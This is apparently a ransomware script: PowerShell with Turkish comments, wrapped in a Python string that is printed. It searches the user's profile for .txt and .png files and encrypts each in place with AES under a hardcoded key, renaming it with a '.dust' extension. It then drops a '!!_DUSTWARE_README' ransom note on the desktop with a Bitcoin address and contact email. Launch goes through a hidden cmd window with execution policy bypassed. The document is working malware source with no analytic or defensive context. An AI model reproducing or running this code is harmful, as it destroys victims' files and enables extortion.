x = """


# [0] XOR Key veya sabit AES key
$k9f3 = "YkU7gH3kLp9sTmVzR2dJ5qW6mA0xZc8B"

# [1] Dosya arama
$__f1leX = @()
$__extz = ".txt", ".png"
gci $env:userprofile -r -ea 0 | ? { !$_.PSIsContainer -and ($__extz -contains $_.Extension) } | % { $__f1leX += $_.FullName }

# [2] Dosya yollarını temp’e yaz
$__p4th = "$env:TEMP\" + [guid]::NewGuid().ToString() + ".dtx"
$__f1leX | Out-File $__p4th -Encoding UTF8

# [3] CMD ile C# çağırma
$__bat = "$env:TEMP\run.bat"
$__psr = "$env:TEMP\runner.ps1"
$__c0d3 = @"
Add-Type -TypeDefinition @'
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class Dusty {
    public static void Encode(string list, string key) {
        byte[] k = Encoding.UTF8.GetBytes(key);
        byte[] iv = new byte[16];

        foreach (string path in File.ReadAllLines(list)) {
            try {
                byte[] b = File.ReadAllBytes(path);
                using (Aes aes = Aes.Create()) {
                    aes.Key = k;
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    byte[] enc = aes.CreateEncryptor().TransformFinalBlock(b, 0, b.Length);
                    File.WriteAllBytes(path, enc);
                    File.Move(path, path + ".dust");
                }
            } catch {}
        }

        File.WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "!!_DUSTWARE_README.txt"),
@"All your files are encrypted.

BTC: 1DustWallet
Contact: dust@protonmail.com");
    }
}
'@
[ Dusty ]::Encode('$__p4th', '$k9f3')
"@

# [4] Kodları CMD üzerinden parçalayarak çalıştır
Set-Content $__psr $__c0d3
Set-Content $__bat "powershell -ExecutionPolicy Bypass -File `"$__psr`""
Start-Process cmd -ArgumentList "/c `"$__bat`"" -WindowStyle Hidden




"""
print(x)